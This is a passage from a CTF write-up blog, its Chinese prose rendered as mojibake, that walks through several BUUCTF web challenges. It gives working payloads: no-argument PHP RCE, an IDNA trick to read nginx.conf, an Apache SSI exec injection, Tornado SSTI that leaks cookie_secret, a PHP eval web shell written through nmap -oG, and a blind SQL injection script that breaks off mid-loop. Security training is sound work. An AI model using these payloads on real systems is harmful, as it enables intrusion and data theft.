<p>ç®€å•ç‚¹æ¥è¯´ï¼Œå°±å¯ä»¥è¿™æ ·ç†è§£ï¼š</p>
<p><code>&#39;/[a-z,_]+\(\)/&#39;</code><br>æŠŠ<code>(?R)</code>æŒ–æ‰å¾—åˆ°è¿™ä¸ªæ­£åˆ™ï¼Œè¿™ä¸ªæ­£åˆ™å¯ä»¥åŒ¹é…ç±»ä¼¼è¿™æ ·çš„å­—ç¬¦ä¸²ï¼š<code>phpinfo()</code><br>ä½†æ˜¯æ‹¬å·é‡Œé¢æœ‰ä¸€ä¸ªé€’å½’æ¨¡å¼ï¼Œå¯ä»¥ç†è§£æˆå¯ä»¥é€’å½’ï¼š</p>
<p><code>phpinfo(phpinfo(phpinfo()))</code><br>æ— ç©·çš„é€’å½’ä¸‹å»ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦ä¼ çš„æ˜¯å‡½æ•°åï¼Œä½†æ˜¯é‡Œé¢ä¸èƒ½æœ‰å‚æ•°ã€‚å› æ­¤è¿™é¢˜çš„è€ƒç‚¹ä¹Ÿå°±æ˜¯<code>æ— å‚æ•°RCE</code></p>
<p>æ–¹æ³•ä¸€ï¼š</p>
<p>?exp&#x3D;readfile(session_id(session_start()));</p>
<p>PHPSESSID&#x3D;flag.php</p>
<p>æ–¹æ³•äºŒï¼š</p>
<p>?exp&#x3D;highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</p>
<p>ç„¶åä¸æ–­å‘é€</p>
<hr>
<h4 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h4><p>Nginxé‡è¦é…ç½®æ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š&#x2F;etc&#x2F;nginx
ä¸»é…ç½®æ–‡ä»¶ï¼š&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf
ç®¡ç†è„šæœ¬ï¼š&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service
æ¨¡å—ï¼š&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules
åº”ç”¨ç¨‹åºï¼š&#x2F;usr&#x2F;sbin&#x2F;nginx
ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html
æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š&#x2F;var&#x2F;log&#x2F;nginx
é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>â„†</code>è¿™ä¸ªå­—ç¬¦,å¦‚æœä½¿ç”¨python3è¿›è¡Œidnaç¼–ç çš„è¯<br>print(â€˜â„†â€™.encode(â€˜idnaâ€™))<br>ç»“æœ<br>bâ€™c&#x2F;uâ€™<br>å¦‚æœå†ä½¿ç”¨utf-8è¿›è¡Œè§£ç çš„è¯<br>print(bâ€™c&#x2F;uâ€™.decode(â€˜utf-8â€™))<br>ç»“æœ<br>c&#x2F;u<br>é€šè¿‡è¿™ç§æ–¹æ³•å¯ä»¥ç»•è¿‡æœ¬é¢˜ï¼Œè¿˜å¯ä»¥ä½¿ç”¨<code>â„‚</code>å­—ç¬¦ç»•è¿‡c</p>
<pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F;suctf.câ„†sr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F;suctf.câ„†sr&#x2F;fffffflag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>åˆ©ç”¨urlunsplitè§£é¢˜</strong></p>
<p>â€ƒå‡å¦‚æˆ‘ä»¬ä¼ å…¥ï¼š<code>file:////www.example.com</code>,è¿›è¡Œäº† <code>list(urlsplit(url))</code> å‡½æ•°ä»¥åå°±å˜æˆäº†<code>[&#39;file&#39;, &#39;&#39;, &#39;//www.example.com&#39;, &#39;&#39;, &#39;&#39;]</code>ã€‚ä¹Ÿå°±æ˜¯å®ƒè§£æåŸŸåå—ä¸ºç©ºäº†ã€‚<br>ä½†å½“å†æ‰§è¡Œ urlunsplit æ—¶ å°±ä¼šåˆæˆä¸º <code>file://www.example.com</code> è¿™æ ·å°±è¾¾åˆ°äº†ç»•è¿‡çš„æ•ˆæœäº†ï¼Œè¿˜æ˜¯éå¸¸å¥ˆæ–¯çš„ï¼ï¼</p>
<hr>
<h4 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h4><p>&#x3D;&#x3D;Apache SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´&#x3D;&#x3D;	å‚è€ƒé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1540513">Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç° - äº‘+ç¤¾åŒº - è…¾è®¯äº‘ (tencent.com)</a></p>
<p>é¦–å…ˆæ˜¯æºç æ³„éœ²ï¼Œè®¿é—®index.php.swpï¼Œæ˜¾ç¤ºæºç ï¼Œå­˜åœ¨md5éªŒè¯ï¼Œæ‹¿è„šæœ¬è·‘å°±ok</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>
  <span class="token keyword">if</span> h <span class="token operator">==</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¾—åˆ°password&#x3D;2020666</p>
<p>åœ¨æŠ“çš„åŒ…ä¸­æœ‰ä¸€ä¸ªurlï¼Œä»¥shtmlç»“å°¾ï¼Œæƒ³åˆ°ssiè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå¯ä»¥ä¸Šä¼ ä¸€ä¸ªshtmlæ–‡ä»¶ï¼Œä½†è¿™é‡Œæ²¡æœ‰æ–‡ä»¶ä¸Šä¼ çš„å…¥å£ï¼Œæƒ³åˆ°å¯ä»¥åˆ©ç”¨usernameä¼ å‚ï¼Œ</p>
<p>payload:</p>
<pre class="line-numbers language-none"><code class="language-none">username&#x3D;&lt;!--#exec cmd&#x3D;&quot;cd ..&#x2F;;cat flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password&#x3D;2020666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶åè®¿é—®å“åº”æŠ¥æ–‡ç»™çš„urlï¼Œæ‹¿åˆ°flag</p>
<hr>
<h4 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h4><p>æ¶‰åŠrenderå‡½æ•°ã€sstiæ³¨å…¥ã€Tornado(pythonçš„webæ¡†æ¶)</p>
<p>ä¸‰ä¸ªtxtæ–‡ä»¶ï¼ŒçŸ¥é“äº†flagæ–‡ä»¶æ˜¯<code>/fllllllllllllag</code></p>
<p>åœ¨hint.txtæ–‡ä»¶ä¸­ä¹ŸçŸ¥é“äº†åŠ å¯†æ ¼å¼<code>md5(cookie_secret+md5(filename))</code></p>
<p>é‡è¦çš„æ˜¯æ‰¾åˆ°<code>cookie_secret</code>ï¼Œ</p>
<p>é‚£ä¹ˆ cookie_secret åˆæ˜¯ä»€ä¹ˆä¸œè¥¿å‘¢ï¼Œåœ¨ Tornado ä¸­ï¼Œé€šè¿‡åœ¨ tornado.web.Application ä¸­æ·»åŠ  cookie_secret å‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ set_secure_cookie() å’Œ get_secure_cookie() å‡½æ•°æ¥å‘é€å’Œå–å¾—æµè§ˆå™¨çš„ cookies ï¼Œå€ŸåŠ©è¯¥å‚æ•°å¯ä»¥å¯¹ cookie è¿›è¡Œç®€æ˜“åŠ å¯†ä»¥é˜²æ­¢ Cookie è¢«æ¶æ„ç¯¡æ”¹ã€‚å…³äº Tornado çš„ cookie_secret å€¼ å¯ä»¥å‚è€ƒåšå®¢<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhanghongfeng/p/8182909.html">tornadoå®‰å…¨åº”ç”¨ä¹‹cookie - ä¸€å¼ çº¢æ«å¶ - åšå®¢å›­ (cnblogs.com)</a>æˆ–è€…<a target="_blank" rel="noopener" href="https://www.cnblogs.com/liyqiang/p/7140530.html">tornadoä¸­çš„cookie - TianTianLi - åšå®¢å›­ (cnblogs.com)</a></p>
<p>ç®€å•æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼Œcookie_secret æ˜¯å­˜åœ¨äº settings ä¸­çš„ï¼Œsettings åˆä½œä¸ºå‚æ•°ä¼ å…¥äº† Application æ„é€ å‡½æ•°ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ self.application.settings æ¥è·å–åˆ° cookie_secretã€‚åˆå› ä¸ºæ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼Œ RequestHandler.settings çš„åˆ«åæ˜¯ self.application.settingsï¼Œä¸” handler æŒ‡å‘å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„ RequestHandler å¯¹è±¡ï¼Œæ•…æœ€ç»ˆçš„æ•ˆæœå°±æ˜¯å¯ä»¥ç›´æ¥é€šè¿‡ handler.settings æ¥å¾—åˆ° cookie_secret çš„å€¼ã€‚</p>
<p>åœ¨ä¸€ä¸ªerroré¡µé¢å­˜åœ¨sstiæ³¨å…¥ï¼Œä¼ å‚<code>msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
<p>æ‹¿åˆ°<code>cookie_secret</code></p>
<p>è„šæœ¬ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#å¯¼å…¥hashlibæ¨¡å—</span>
<span class="token keyword">import</span> hashlib

<span class="token comment">#è·å–ä¸€ä¸ªmd5åŠ å¯†ç®—æ³•å¯¹è±¡</span>
md <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#ç”¨æä¾›çš„ å­—èŠ‚ä¸² æ›´æ–°æ­¤å“ˆå¸Œå¯¹è±¡(hash object)çš„çŠ¶æ€ã€‚</span>
md<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">'/fllllllllllllag'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#NOTICEï¼š</span>
<span class="token comment">#update()æ–¹æ³•éœ€è¦æ¥æ”¶çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—èŠ‚å¯¹è±¡ã€‚</span>
<span class="token comment">#å‘å¯¹è±¡ä¸­ä¼ å…¥å­—èŠ‚ä¸²æ—¶ï¼Œå¿…é¡»ä¸ºç¼–ç ç±»å‹ã€‚å¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²å‰b' 'çš„æ–¹æ³•æˆ–ä½¿ç”¨.encode('UTF-8')çš„æ–¹æ³•ï¼Œä½¿å­—ç¬¦ä¸²å˜ä¸ºbytesç±»å‹</span>

<span class="token comment">#ä»¥åå…­è¿›åˆ¶æ•°å­—å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›æ‘˜è¦å€¼ï¼ˆå“ˆå¸Œå‡½æ•°è®¡ç®—åç”Ÿæˆçš„å€¼å°±å«åšæ‘˜è¦æˆ–è€…æ‘˜è¦å€¼ï¼‰</span>
fact <span class="token operator">=</span> md<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

md <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
md<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'8a666cd6-6ece-4793-9236-dd7c75a5ff97'</span> <span class="token operator">+</span> fact<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>md<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœ€ç»ˆpayloadï¼š<code>?filename=/fllllllllllllag&amp;filehash=1c96931b251b0ee71fd6751fb4d68db9</code></p>
<h4 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="*[HCTF 2018]admin"></a>*[HCTF 2018]admin</h4><p>æœ‰ä¸‰ç§æ–¹æ³•ï¼š</p>
<ol>
<li><p>flask sessionä¼ªé€ </p>
<p>æ³¨å†Œè´¦å·ï¼Œç„¶ååœ¨æ”¹å¯†ç çš„é¡µé¢æºç å‘ç° <a target="_blank" rel="noopener" href="https://github.com/woadsl1234/hctf_flask/">https://github.com/woadsl1234/hctf_flask/</a> ï¼Œåœ¨githubä¸Šå¯ä»¥æ‰¾åˆ°æºç ã€‚flaskæ˜¯è½»é‡çº§webæ¡†æ¶ï¼Œsessionå­˜åœ¨å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ªé€ session(cookie)ã€‚<br>ç¬¬ä¸€æ­¥ï¼Œæƒ³è¦åŠ å¯†ä¼ªé€ ç”Ÿæˆæˆ‘ä»¬è‡ªå·±çš„sessionçš„è¯ï¼Œè¿˜éœ€è¦çŸ¥é“flaskç”¨æ¥ç­¾åçš„<code>SECRET_KEY</code>ï¼Œåœ¨config.pyé‡Œã€‚<br>ç¬¬äºŒæ­¥ï¼Œæ‰¾åˆ°flask sessionåŠ å¯†è„šæœ¬ï¼Œç„¶åéšä¾¿æ‰¾ä¸€ä¸ªè‡ªå·±çš„cookieï¼Œè§£å¯†åå§nameçš„å€¼æ”¹ä¸ºadminå†è¿›è¡ŒåŠ å¯†ã€‚ï¼ˆ&#x3D;&#x3D;è¿™é‡Œè„šæœ¬ä¸ä¼šä½¿ç”¨&#x3D;&#x3D;ï¼‰<br>æœ€åï¼Œå°†sessionè¾“å›å»ï¼Œè¿”å›indexå¾—flagã€‚</p>
</li>
<li><p>unicodeæ¬ºéª—</p>
<p>é¦–å…ˆæ³¨å†Œè´¦å·ï¼šá´¬á´°á´¹á´µá´ºï¼Œå¯†ç ï¼š123<br>ç„¶åæ›´æ”¹å¯†ç <br>æœ€åä»¥adminç™»å½•å¤§è‡´çš„æ€è·¯æ˜¯ï¼š<br>åœ¨æ³¨å†Œçš„æ—¶å€™ â€á´¬á´°á´¹á´µá´ºâ€œ ç»è¿‡strlower()ï¼Œè½¬    æˆâ€ADMINâ€œ ï¼Œ åœ¨ä¿®æ”¹å¯†ç çš„æ—¶å€™ â€ADMINâ€œç»è¿‡strlower()å˜æˆâ€adminâ€œ , å½“æˆ‘ä»¬å†æ¬¡é€€å‡ºç™»å½•çš„æ—¶å€™ â€adminâ€œç»è¿‡strlower()å˜æˆâ€adminâ€œ(æ²¡å•¥åµç”¨ï¼Œä½†æ˜¯ä½ å·²ç»çŸ¥é“äº†ä¸€ä¸ªå¯†ç å·²çŸ¥çš„â€adminâ€œï¼Œè€Œä¸”åœ¨index.htmlä¸­å¯ä»¥çœ‹åˆ°åªè¦session[â€˜nameâ€™]&#x3D;&#x3D;â€™adminâ€™,ä¹Ÿå°±æ˜¯åªè¦ç”¨æˆ·åæ˜¯â€™adminâ€˜å°±å¯æˆåŠŸç™»å½•äº†)</p>
</li>
<li><p>æ¡ä»¶ç«äº‰</p>
<p>ä»”ç»†è§‚å¯Ÿæºç ï¼Œå¯ä»¥å‘ç°loginå‡½æ•°å’Œchangeå‡½æ•°éƒ½åœ¨æ²¡æœ‰å®Œå…¨checkèº«ä»½çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œäº†sessionæœ‰å…³çš„èµ‹å€¼ã€‚<br>æˆ‘ä»¬å¯ä»¥è¿™æ ·è®¾æƒ³ï¼Œä¸€ä¸ªè¿›ç¨‹ä»¥æ­£å¸¸è´¦å·ä¸€ç›´ä¾æ¬¡è¿›è¡Œç™»å½•ã€æ”¹å¯†ç æ“ä½œï¼Œå¦ä¸€ä¸ªè¿›ç¨‹åŒæ—¶ä¸€ç›´ä¾æ¬¡è¿›è¡Œæ³¨é”€ã€ä»¥adminç”¨æˆ·ååŠ è¿›ç¨‹1æ›´æ”¹çš„æ–°å¯†ç è¿›è¡Œç™»å½•ã€‚å°±æœ‰å¯èƒ½å‡ºç°å½“è¿›ç¨‹1è¿›è¡Œåˆ°æ”¹å¯†ç å‡½æ•°æ—¶ï¼Œè¿›ç¨‹2è¿›è¡Œåˆ°ç™»å½•æ“ä½œï¼Œè¿™ä¸ªæ—¶å€™è¿›ç¨‹1éœ€è¦ä»sessionä¸­å–å‡ºnameï¼Œè€Œè¿›ç¨‹2æ­¤æ—¶æŠŠsession[â€˜nameâ€™]æ”¹æˆäº†adminã€‚<br>æ‰€ä»¥å°±å¯ä»¥ç¼–å†™è„šæœ¬è¿›è¡Œæ¡ä»¶ç«äº‰ï¼Œæ¡ä»¶ç«äº‰ç»“æŸçš„æ ‡å¿—ä¸ºè¿›ç¨‹2ç™»å½•æ“ä½œæˆåŠŸï¼Œå³é‡å®šå‘åˆ°&#x2F;indexï¼ˆ&#x3D;&#x3D;è¿™é‡Œè„šæœ¬ä¸ä¼šå†™&#x3D;&#x3D;ï¼‰</p>
</li>
</ol>
<hr>
<h4 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="*[BUUCTF 2018]Online Tool"></a>*[BUUCTF 2018]Online Tool</h4><p><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/#2-CVE-2016-10045">è°ˆè°ˆescapeshellargå‚æ•°ç»•è¿‡å’Œæ³¨å…¥çš„é—®é¢˜ (lmxspace.com)</a></p>
<p>remote_addrå’Œx_forwarded_forè¿™ä¸¤ä¸ªæ˜¯è§çš„æ¯”è¾ƒå¤šçš„ï¼ŒæœåŠ¡å™¨è·å–ipç”¨çš„ï¼Œè¿™é‡Œæ²¡ä»€ä¹ˆç”¨</p>
<p>å‘ç°åœ¨nmapå‘½ä»¤ä¸­ æœ‰ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶</p>
<p>è¿™ä¸ªå‘½ä»¤å°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥å¯æ§ï¼ç„¶åå†™å…¥åˆ°æ–‡ä»¶ï¼OKå¾ˆè‡ªç„¶çš„æƒ³åˆ°äº†ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬äº†â€¦</p>
<p>æˆ‘ä»¬æ¥æ„é€ payload</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">?host=' <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"hack"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> -oG hack.php '<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ‰§è¡Œåä¼šè¿”å›æ–‡ä»¶å¤¹åï¼Œç„¶åç”¨èšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°flag</p>
<hr>
<h4 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h4><p>å‘ç°robots.txtæ–‡ä»¶æœ‰æç¤ºï¼Œ<code>*.php.bak</code>ï¼Œè¯´æ˜æœ‰å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼Œåœ¨f12çš„ç½‘ç»œé‡Œå‘ç°äº†image.phpï¼Œå°è¯•ä¸‹è½½image.php.bakï¼ŒæˆåŠŸäº†ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span>

<span class="token variable">$id</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
<span class="token variable">$path</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$path</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"%00"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$path</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"%00"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"select * from images where id='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token punctuation">&#125;</span></span>' or path='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$path</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span><span class="token constant">MYSQLI_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$path</span><span class="token operator">=</span><span class="token string double-quoted-string">"./"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°sqlè¯­å¥ï¼Œå¯ä»¥ä¼ é€’idå’Œpathä¸¤ä¸ªå‚æ•°ï¼Œè§¦å‘SQLæ³¨å…¥ï¼Œå‰ææ˜¯è¦ç»•è¿‡å¯¹idå’Œpathçš„è¿‡æ»¤ã€‚æ¥ä¸‹æ¥æƒ³åŠæ³•ç»•è¿‡è¿‡æ»¤ï¼Œä¸»è¦æ˜¯ç ´åå•å¼•å·</p>
<p>åªèƒ½æ˜¯ç”¨è½¬ä¹‰å­—ç¬¦<code>\</code>æˆ–è€…å•å¼•å·è‡ªå·±æ¥ç ´åã€‚ä½†æ˜¯ç”¨å•å¼•å·ä¸€å®šä¼šè¢«æ›¿æ¢æ‰ï¼Œåªèƒ½è€ƒè™‘<code>\</code></p>
<p>å¦‚æœå‚æ•°ä¸­æœ‰<code>\</code>æˆ–è€…<code>&#39;</code>ä¼šè¢«åœ¨åŠ ä¸Šä¸€ä¸ª<code>\</code>æ¥è½¬ä¹‰ã€‚å› æ­¤å¦‚æœä»¤idä¸º<code>\0</code>ï¼Œidä¼šå…ˆå˜æˆ<code>\\0</code>ã€‚ä¹‹å<code>\0</code>è¢«æ›¿æ¢æ‰ï¼Œä¼šå‰©ä¸‹ä¸€ä¸ª<code>\</code></p>
<p>è„šæœ¬ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span>url_format<span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    rlt <span class="token operator">=</span> <span class="token string">''</span>
    url  <span class="token operator">=</span> url_format
    <span class="token keyword">if</span> length<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">:</span>
        length <span class="token operator">=</span> <span class="token number">30</span>
    <span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span>
        begin <span class="token operator">=</span> <span class="token number">32</span>
        ends <span class="token operator">=</span> <span class="token number">126</span>
        tmp <span class="token operator">=</span> <span class="token punctuation">(</span>begin<span class="token operator">+</span>ends<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token keyword">while</span> begin<span class="token operator">&lt;</span>ends<span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> r<span class="token punctuation">.</span>content<span class="token operator">!=</span><span class="token string">b''</span><span class="token punctuation">:</span>
                begin <span class="token operator">=</span> tmp<span class="token operator">+</span><span class="token number">1</span>
                tmp <span class="token operator">=</span> <span class="token punctuation">(</span>begin<span class="token operator">+</span>ends<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                ends <span class="token operator">=</span> tmp
                tmp <span class="token operator">=</span> <span class="token punctuation">(</span>begin<span class="token operator">+</span>ends<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
